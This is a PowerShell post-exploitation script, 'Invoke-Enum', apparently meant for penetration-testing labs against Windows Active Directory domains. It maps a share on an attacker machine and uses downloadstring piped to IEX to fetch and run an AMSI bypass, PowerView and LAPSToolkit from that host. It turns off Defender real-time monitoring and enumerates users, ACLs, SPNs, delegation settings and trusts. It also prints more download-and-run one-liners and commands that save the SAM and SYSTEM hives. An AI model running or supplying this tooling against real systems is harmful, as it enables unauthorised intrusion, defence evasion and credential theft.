function Invoke-Enum{
    <#

    .SYNOPSIS

    This function runs a subset of enumeration steps

    Enum Function: Invoke-Enum
    Author: m0n0rchid
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    .DESCRIPTION

    This function runs a subset of enumeration steps

    .PARAMETER RemoteIP

    The IP of the remote attacker machine

    .PARAMETER RemoteUser

    The user setup with a samba share

    .Example

    C:\PS> Invoke-Enum -RemoteIP 192.168.1.1 -RemoteUser WORKGROUP\h4x

    Description
    -----------
    Run the enumeration

    #>
    
    Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $RemoteIP,

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $RemoteUser

    )


    Write-Output "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    Write-Output "'#######:'#######:'#######:'#######:'#######:'#######:'#######:'#######:"
    Write-Output "........:........:........:........:........:........:........:........:"
    Write-Output "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    Write-Output ":::::::::::::::'########:'##::: ##:'##::::'##:'##::::'##::::::::::::::::"
    Write-Output "::::::::::::::: ##.....:: ###:: ##: ##:::: ##: ###::'###::::::::::::::::"
    Write-Output "::::::::::::::: ##::::::: ####: ##: ##:::: ##: ####'####::::::::::::::::"
    Write-Output "::::::::::::::: ######::: ## ## ##: ##:::: ##: ## ### ##::::::::::::::::"
    Write-Output "::::::::::::::: ##...:::: ##. ####: ##:::: ##: ##. #: ##::::::::::::::::"
    Write-Output "::::::::::::::: ##::::::: ##:. ###: ##:::: ##: ##:.:: ##::::::::::::::::"
    Write-Output "::::::::::::::: ########: ##::. ##:. #######:: ##:::: ##::::::::::::::::"
    Write-Output ":::::::::::::::........::..::::..:::.......:::..:::::..:::::::::::::::::"
    Write-Output "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    Write-Output "'#######:'#######:'#######:'#######:'#######:'#######:'#######:'#######:"
    Write-Output "........:........:........:........:........:........:........:........:"
    Write-Output "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"


    Write-Output "[+] whoami"
    whoami
    Write-Output "[+] whoami /priv"
    whoami /priv
    Write-Output "[+] /groups"
    whoami /groups

    $ErrorActionPreference = "stop"

    Write-Output "==========================================="

    $mode = $ExecutionContext.SessionState.LanguageMode
    if ($mode -eq "FullLanguage") {
        Write-Output "[+] FULL LANGUAGE ENV"
    } else {
        Exit
    }

    try
    {
        Write-Output "[+] setup share"
        net use z: \\$RemoteIP\share\windows "" /user:$RemoteUser | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] copy accesschk from share"
        Copy-Item -Path z:\accesschk.exe -Destination c:\windows\tasks\accesschk.exe -Force

        Write-Output "[+] run accesschk"
        c:\windows\tasks\accesschk.exe -accepteula -uwcqv "Authenticated Users" *  | Out-String

        # Write-Output "[+] checking for writable folders for $Env:Username"
        # c:\windows\tasks\accesschk.exe -accepteula "$Env:Username" C:\windows -wus | Out-File "writable.txt"
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }


    try
    {
        Write-Output "[+] attempting to disable Anti Malware Scanning Interface"
        (new-object system.net.webclient).downloadstring("http://$RemoteIP/amsi.txt") | IEX
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try 
    {
        Write-Output "[+] importing PowerView"
        (new-object system.net.webclient).downloadstring("http://$RemoteIP/powerview.txt") | IEX
    }
    catch
    {
        Write-Output "[!] import failed. Exiting"
        Exit
    }

    try
    {
        Write-Output "[+] attempting to disable realtime monitoring"
        Set-MpPreference -DisableRealtimeMonitoring $true | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try 
    {
        Write-Output "[+] looking for users"
        Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] enumerate all domain groups that our current user has explicit access"
        Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Out-String
    }
    catch 
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] enumerate misconfigureqd user accounts"
        Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")){$_}} | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] getting MSSQL SPN for current user"
        setspn -T $env:UserDomain -Q MSSQLSvc/*  | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] checking is LSASS is enabled"
        $prop = Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
        if ($prop.RunAsPPL -eq 1)
        {
            Write-Output "`t[!] LSASS is enabled"
            write-Output "`t[+] downloading LAPSTookkit"
            try 
            {
                (new-object system.net.webclient).downloadstring("http://$RemoteIP/LAPSToolkit.ps1") | IEX
                Get-LAPSComputers | Out-String
            }
            catch 
            {
                Write-Output "`t[!] LAPSToolkit FAILED"
            }

        }
        else
        {
            Write-Output "[!] LSAASS NOT enabled"
        }
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    Write-Output "==========================================="

    try
    {
        Write-Output "[+] enumerate all servers that allow unconstrained delegation"
        Get-DomainComputer -Unconstrained | Out-String
        Write-Output "[+] all privileged users that aren't marked as sensitive/not for delegation"
        Get-DomainUser -AllowDelegation -AdminCount | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] check for computers with constrained delegation"
        Get-DomainComputer -TrustedToAuth | Out-String
        Write-Output "[+] check for users with constrained delegation"
        Get-DomainUser -TrustedToAuth | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] check for Service Based Constrained Delegation"
        Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] find users with sidHistory set"
        Get-DomainUser -LDAPFilter '(sidHistory=*)' | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }


    try
    {
        Write-Output "[+] getting domain trust mapping"
        Get-DomainTrustMapping | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] get computers in domain"
        Get-NetComputer | select samaccountname, operatingsystem | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] getting proxy information"
        [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://$RemoteIP/enum.ps1") | Out-String
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }


    Write-Output "==========================================="
    Write-Output "[+] Did you:"
    Write-Output "`t[-] Check if you can impersonate anyone?"
    whoami /priv | findstr Impersonate | Out-String
    Write-Output "`t[-] Sharphound.exe --ZipFileName file.zip --CollectionMethod All --Domain $env:UserDomain"
    Write-Output "`t[-] Check SID Filtering? netdom trust $env:UserDomain /domain: <DOMAIN 2> /quarantine"
    Write-Output "`t[+] Some other enumeration scripts to try:"
    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/PowerUp.ps1') | IEX; Invoke-AllChecks"
    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/HostRecon.ps1') | IEX; Invoke-HostRecon"
    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/jaws-enum.ps1') | IEX"
    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/SessionGopher.ps1') | IEX; Invoke-SessionGopher -Thorough"
    Write-Output "`t[+] Can you dump the registry (not tried)?"
    Write-Output "`t[-] reg save HKLM\sam sam.reg"
    Write-Output "`t[-] reg save HKLM\system system.reg"
    Write-Output "`t[^] TRY HARDER?"
    Write-Output "`t[^] TRY HARDER?"
    Write-Output "`t[^] TRY HARDER?"
    Write-Output "==========================================="
}
